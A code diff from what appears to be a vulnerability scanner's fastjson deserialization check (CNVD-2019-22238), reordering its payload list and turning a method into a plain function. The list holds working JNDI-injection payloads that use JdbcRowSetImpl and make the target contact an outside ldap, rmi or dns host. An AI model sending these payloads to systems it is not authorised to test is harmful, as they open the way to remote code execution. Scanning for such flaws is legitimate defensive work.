@@ -6,18 +6,18 @@ from lib.tool.md5 import random_md5
 from time import sleep
 
 cnvd_2019_22238_payloads = [
-    {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://DNSDOMAIN/b152","autoCommit":true}}'''},
     {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://DNSDOMAIN/0333","autoCommit":true}}'''},
     {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://DNSDOMAIN/c1d1","autoCommit":true}}'''},
+    {'data': '''{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://DNSDOMAIN/b152","autoCommit":true}}'''},
 ]
 
-def cnvd_2019_22238_scan(self, clients):
+def cnvd_2019_22238_scan(clients):
     ''' fastjson <= 1.2.47 反序列化漏洞 '''
     client = clients.get('reqClient')
     sessid = '7741b152f4f34cf03332b54c1d1f4320'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Fastjson',
         'vul_type': 'unSerialize',
         'vul_id': 'CNVD-2019-22238',
     }
